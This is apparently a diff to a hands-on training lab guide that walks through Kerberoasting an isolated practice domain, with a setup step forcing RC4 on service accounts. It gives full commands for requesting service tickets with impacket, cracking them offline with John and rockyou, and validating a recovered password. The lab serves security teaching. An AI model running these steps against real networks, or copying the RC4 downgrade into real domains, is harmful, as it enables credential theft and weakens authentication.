@@ -22,112 +22,77 @@ those tickets offline to recover the service accounts' plaintext passwords.
 | Attacker host | `kali` (tools pre-installed) |
 | Starting credential (assume-breach, low-priv user) | `amiller` / `Summer2024` |
 
+> The steps below are in order. A **▶ host** banner tells you which machine to run each step on.
+
 ---
 
-1. Connect to the **Kali** attacker host over SSH (use the Kali IP / password from the
-   **Environment** tab), and confirm you can reach the domain.
+## ▶ DC1 — environment prep
+
+1. Switch to the **DC1** console and open an elevated **PowerShell** as `CORP\azureuser`.
+
+1. Ensure the Kerberoastable service accounts use **RC4** encryption, so their tickets come
+   back in the classic crackable format:
+
+    ```powershell
+    'svc.sql','svc.web','svc.mssql','svc.sccm','svc.iis' | ForEach-Object {
+        Set-ADUser -Identity $_ -Replace @{ 'msDS-SupportedEncryptionTypes' = 4 }
+    }
+    ```
+
+---
+
+## ▶ Kali — the attack
+
+1. Switch to the **Kali** host (SSH in using the details from the **Environment** tab) and
+   confirm you can reach the domain.
 
     ```bash
-    ssh kaliuser@<kali-public-ip>
     nslookup dc1.corp.local
     ```
 
     **Expected Output:** `dc1.corp.local` resolves to **10.0.1.10**.
 
-1. Validate the low-privileged domain credentials against the Domain Controller using
-   **netexec**.
+1. Validate the low-privileged domain credentials against the Domain Controller.
 
     ```bash
     netexec smb 10.0.1.10 -u amiller -p 'Summer2024'
     ```
 
-    **Expected Output:**
+    **Expected Output:** a `[+] corp.local\amiller:Summer2024` line confirms the credentials.
 
-    ```output
-    SMB   10.0.1.10   445   DC1   [*] Windows Server 2019 ... (name:DC1) (domain:corp.local)
-    SMB   10.0.1.10   445   DC1   [+] corp.local\amiller:Summer2024
-    ```
-
-    The `[+]` confirms the credentials are valid on the domain.
-
-1. Request Kerberos service tickets (TGS) for **every account that has an SPN** using
-   impacket's **GetUserSPNs** with the `-request` flag. Any authenticated domain user can do
-   this — that's what makes Kerberoasting powerful.
+1. Request Kerberos service tickets (TGS) for **every account that has an SPN**. Any
+   authenticated domain user can do this — that's what makes Kerberoasting powerful.
 
     ```bash
     impacket-GetUserSPNs corp.local/amiller:'Summer2024' -dc-ip 10.0.1.10 -request -outputfile /tmp/kerberoast.txt
     ```
 
-    **Expected Output:** a table of SPN-enabled service accounts, and the ticket hashes are
-    saved to `/tmp/kerberoast.txt`.
+    **Expected Output:** a table of SPN-enabled service accounts (`svc.web`, `svc.mssql`,
+    `svc.sccm`, `svc.sql`, `svc.iis`); the ticket hashes are saved to `/tmp/kerberoast.txt`.
 
-    ```output
-    ServicePrincipalName            Name       MemberOf   PasswordLastSet   ...
-    ------------------------------  ---------  ---------  ----------------  ...
-    MSSQLSvc/sql01.corp.local:1433  svc.sql
-    HTTP/web.corp.local             svc.web
-    MSSQLSvc/mssql.corp.local:1433  svc.mssql
-    HTTP/sccm.corp.local            svc.sccm
-    HTTP/intranet.corp.local        svc.iis
-    ```
-
-    > **Note (time skew):** if you see `KRB_AP_ERR_SKEW`, sync the clock and retry:
-    > `sudo systemctl restart systemd-timesyncd && sleep 5`
-
-1. Prepare the **rockyou** wordlist (installed with the `wordlists` package; it ships
-   gzip-compressed).
+1. Prepare the **rockyou** wordlist and crack the tickets offline with **John the Ripper**
+   (CPU-based, auto-detects the ticket type — no GPU needed).
 
     ```bash
     sudo apt-get install -y wordlists
     sudo gunzip -kf /usr/share/wordlists/rockyou.txt.gz
-    ls -lh /usr/share/wordlists/rockyou.txt
-    ```
-
-1. Crack the extracted ticket hashes offline with **John the Ripper** (CPU-based, and it
-   auto-detects the ticket type — no GPU/OpenCL needed, which suits a cloud VM).
-
-    ```bash
     john /tmp/kerberoast.txt --wordlist=/usr/share/wordlists/rockyou.txt
     john --show /tmp/kerberoast.txt
     ```
 
-    **Expected Output:** one or more service accounts crack — e.g. `svc.web` recovers to
-    **`Password1`** (others such as `svc.mssql`, `svc.sccm`, `svc.sql` may also crack):
+    **Expected Output:** one or more service accounts crack — e.g. `svc.web` → **`Password1`**.
 
-    ```output
-    Password1        (?)
-    ...
-    $krb5tgs$...:Password1
-    ```
-
-    > **Using hashcat instead?** hashcat needs an OpenCL/CUDA backend. On a GPU-less cloud VM,
-    > install the CPU runtime first (`sudo apt install -y pocl-opencl-icd`), then use the mode
-    > matching the ticket type: `-m 13100` for RC4 (`$krb5tgs$23$`) or `-m 19700` for AES256
-    > (`$krb5tgs$18$`). John avoids this by auto-detecting.
-
-1. Confirm the recovered service-account credential is valid on the domain (here against the
-   MSSQL server).
+1. Confirm the recovered service-account credential is valid on the domain.
 
     ```bash
     netexec smb 10.0.1.20 -u svc.web -p 'Password1'
     ```
 
-    **Expected Output:**
+    **Expected Output:** `[+] corp.local\svc.web:Password1`.
 
-    ```output
-    SMB   10.0.1.20   445   MSSQL   [+] corp.local\svc.web:Password1
-    ```
-
-**Lab 1 Recap:** In this lab, you:
-
-- Validated a low-privileged domain credential against the DC with `netexec`.
-- Requested TGS tickets for all SPN-enabled service accounts with `GetUserSPNs`.
-- Cracked the ticket hashes offline with `hashcat` + `rockyou`, recovering plaintext
-  service-account passwords.
-- Confirmed a recovered credential works on the domain.
-
-This proves the domain's **weak service-account passwords + Kerberoastable SPNs** are
-exploitable exactly as designed.
+**Lab 1 Recap:** You validated a low-privileged credential, requested TGS tickets for all
+SPN-enabled service accounts, cracked them offline with John, and confirmed a recovered
+password works — proving the domain's weak, Kerberoastable service accounts are exploitable.
 
 ## You have successfully completed Lab 1.
 
